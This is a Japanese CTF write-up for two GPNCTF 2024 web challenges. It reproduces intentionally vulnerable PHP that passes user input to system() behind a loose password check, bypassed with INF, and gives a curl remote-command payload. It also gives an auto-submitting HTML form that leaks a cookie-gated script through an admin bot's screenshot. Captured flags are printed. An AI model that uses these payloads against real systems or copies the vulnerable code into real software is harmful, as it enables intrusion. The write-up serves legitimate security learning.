---
title: "GPNCTF Writeup"
id: "GPNCTF-2024-Writeup"
description: "GPNCTFのWriteupです。"
author: "rikoteki"
createdAt: "2024-06-02"
isDraft: false
---

Webサイトがプレイリストっぽくてかっこ良い。

Webジャンルの2問だけ説いた。

# [Web] Never gonna tell a lie and type you

シンプルな単一PHPファイルのWebアプリ。

```php
<?php
       ini_set("display_errors",1);
       error_reporting(E_ALL);
//we tought about using passwords but you see everyone says they are insecure thus we came up with our own riddle.
function securePassword($user_secret){
    if ($user_secret < 10000){
        die("nope don't cheat");
    }
    $o = (integer) (substr(hexdec(md5(strval($user_secret))),0,7)*123981337);
    return $user_secret * $o ;

}
//this weird http parameter handling is old we use json
$user_input = json_decode($_POST["data"]);
//attention handling user data is dangerous
var_dump($user_input);

if ($_SERVER['HTTP_USER_AGENT'] != "friendlyHuman"){
    die("we don't tolerate toxicity");
}
    if($user_input->{'user'} === "admin🤠") {
        if ($user_input->{'password'} == securePassword($user_input->{'password'})  ){
            echo " hail admin what can I get you ". system($user_input->{"command"});
        }
        else {
            die("Skill issue? Maybe you just try  again?");
        }}
        else {
            echo "<html>";
            echo "<body>";
            echo "<h1>Welcome [to innovative Web Startup]</h1>";
            echo "<p> here we focus on the core values of each website. The backbone that carries the entire frontend</p><br><br>";
            echo "<blink>For this we only use old and trusty tools that are well documented and well tested</blink><br><br>";
            echo "<Big>That is not to say that we are not innovative, our authenticators are ahead of their time.</Big><br><br>";
           echo "<plaintext> to give you an teaser of our skills look at this example of commissioned work we build in a past project </plaintext>";

            echo system("fortune")."<br>";
        }
?>
```
ソースを読むと以下条件を満たすと`$.command`に設定したOSコマンドが実行できる様子。

- UAが`friendlyHuman`である
- `$.user`が`admin🤠`である
- `$.password` == `securePassword($.password)`である

`securePassword`関数の実装を見てみると、`password`が10000以上であることを検証している。
そして、`password`から導出した値と`password`自身を乗算した結果を返している。
`password` < 10000 の検証は0が使えないようにするためだろう。

```php
function securePassword($user_secret){
    if ($user_secret < 10000){
        die("nope don't cheat");
    }
    $o = (integer) (substr(hexdec(md5(strval($user_secret))),0,7)*123981337);
    return $user_secret * $o ;

}
```

ただし、`INF`の検証が行われていないため`securePassword`関数に`INF`を渡すと`INF`が返ってくる。

![image](https://github.com/r1k0t3k1/note/assets/57973603/fb16b9f6-e43a-4d75-a9af-36eb5fd8319c)

以上のことから`password`に、評価されるとINFになるような数値を指定することでOSコマンドが実行できる。

```bash
curl -X POST -H 'User-Agent: friendlyHuman'  --data-binary $'data={\"user\":\"admin\xf0\x9f\xa4\xa0\",\"password\":1e309,\"command\":\"cat /flag.txt\"}'  https://the-sound-of-silence--qzeng-1488.ctf.kitctf.de
```

## flag

```
GPNCTF{1_4M_50_C0NFU53D_R1GHT_N0W}
```

# [Web] todo

HTMLをSubmitすると管理者botがフラグ付きでアクセスしてくれる系の問題。

<details>
<summary>server.js</summary>

```js
const express = require('express');
const puppeteer = require('puppeteer');

const randomBytes = require('crypto').randomBytes(32).toString('hex');

const fs = require('fs');

const flag = process.env.FLAG || fs.readFileSync('./flag', 'utf8');
const script = fs.readFileSync('./script.js', 'utf8');

const app = express();
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.send(`
        <h1>TODO</h1>
        <form action="/chal" method="post">
            <input type="text" name="html" placeholder="HTML">
            <button type="submit">Submit to /chal</button>
        </form>
        <hr>
        <form action="/admin" method="post">
            <input type="text" name="html" placeholder="HTML">
            <button type="submit">Submit to /admin</button>
        </form>
    `);
});

app.post('/chal', (req, res) => {
    const { html } = req.body;
    res.setHeader("Content-Security-Policy", "default-src 'none'; script-src 'self' 'unsafe-inline';");
    res.send(`
        <script src="/script.js"></script>
        ${html}
    `);
});

app.get('/script.js', (req, res) => {
    res.type('.js');
    let response = script;
    if ((req.get("cookie") || "").includes(randomBytes)) response = response.replace(/GPNCTF\{.*\}/, flag)
    res.send(response);
});

app.post('/admin', async (req, res) => {
    try {
        const { html } = req.body;
        const browser = await puppeteer.launch({ executablePath: process.env.BROWSER, args: ['--no-sandbox'] });
        const page = await browser.newPage();
        page.setCookie({ name: 'flag', value: randomBytes, domain: 'localhost', path: '/', httpOnly: true });
        await page.goto('http://localhost:1337/');
        await page.type('input[name="html"]', html);
        await page.click('button[type="submit"]');
        await new Promise(resolve => setTimeout(resolve, 2000));
        const screenshot = await page.screenshot({ encoding: 'base64' });
        await browser.close();
        res.send(`<img src="data:image/png;base64,${screenshot}" />`);
    } catch(e) {console.error(e); res.send("internal error :( pls report to admins")}
});

app.listen(1337, () => console.log('listening on http://localhost:1337'));
```
</details>

`/admin`にHTMLをSubmitすると管理者botがCookieにフラグを付与してアクセスしてくれる。
が、Cookie自体はHttpOnly属性が付与されている。

その他の挙動として、管理者botがアクセスしたページのスクリーンショットを撮影し、`/admin`のレスポンスとして返してくれるため、
管理者botが閲覧したページの描画結果が確認できる。

```js
app.post('/admin', async (req, res) => {
    try {
        const { html } = req.body;
        const browser = await puppeteer.launch({ executablePath: process.env.BROWSER, args: ['--no-sandbox'] });
        const page = await browser.newPage();
        page.setCookie({ name: 'flag', value: randomBytes, domain: 'localhost', path: '/', httpOnly: true });
        await page.goto('http://localhost:1337/');
        await page.type('input[name="html"]', html);
        await page.click('button[type="submit"]');
        await new Promise(resolve => setTimeout(resolve, 2000));
        const screenshot = await page.screenshot({ encoding: 'base64' });
        await browser.close();
        res.send(`<img src="data:image/png;base64,${screenshot}" />`);
    } catch(e) {console.error(e); res.send("internal error :( pls report to admins")}
});

```

フラグはどこにあるかというと`/script.js`というJavaScriptファイル内にコメントアウトされている。

```js
class FlagAPI {
    constructor() {
        throw new Error("Not implemented yet!")
    }

    static valueOf() {
        return new FlagAPI()
    }

    static toString() {
        return "<FlagAPI>"
    }

    // TODO: Make sure that this is secure before deploying
    // getFlag() {
    //     return "GPNCTF{FAKE_FLAG_ADMINBOT_WILL_REPLACE_ME}"
    // }
}⏎
```

このフラグ自体はダミーフラグであり、`/script.js`へのアクセスに管理者権限のCookieが付与されていた場合のみ、
正規のフラグに置換されてレスポンスされる。

```js
app.get('/script.js', (req, res) => {
    res.type('.js');
    let response = script;
    if ((req.get("cookie") || "").includes(randomBytes)) response = response.replace(/GPNCTF\{.*\}/, flag)
    res.send(response);
});
```

また、管理者botにアクセスさせるページには以下のようなCSPが設定される。

```
app.post('/chal', (req, res) => {
    const { html } = req.body;
    res.setHeader("Content-Security-Policy", "default-src 'none'; script-src 'self' 'unsafe-inline';");
    res.send(`
        <script src="/script.js"></script>
        ${html}
    `);
});
```

単純にJavaScript Hijack問題かと思ったが、フラグを出力する関数自体がコメントアウトされているため、読み込み元のJavaScriptで実行することができない。

このサイトの挙動を思い出すと、管理者botがアクセスしたページの描画結果が確認できるので、関数が実行できなくてもコメントアウトされているソース自体を見れるのではないかと考えた。

具体的には管理者botに閲覧させたHTMLから`/script.js`へのform submitを発生させ、テキストとして描画させる。

CSPに`default-src: none`が付与されているが`form-src`のフォールバックは無いため問題ない。

`/admin`へ送信するHTMLは以下

```html
<html>
    <body>
      <form id="form" action="/script.js" method="get"></form>
      <script>
        document.getElementById("form").submit();
      </script>
    </body>
</html>
```

このHTMLを送信するとフラグを含んだ画像が確認できる。

![image](https://github.com/r1k0t3k1/note/assets/57973603/a50bf8de-f075-4d8f-a62e-69618611b064)

## flag

```
GPNCTF{N0_C0MM3NT_b7c62b1e}
```
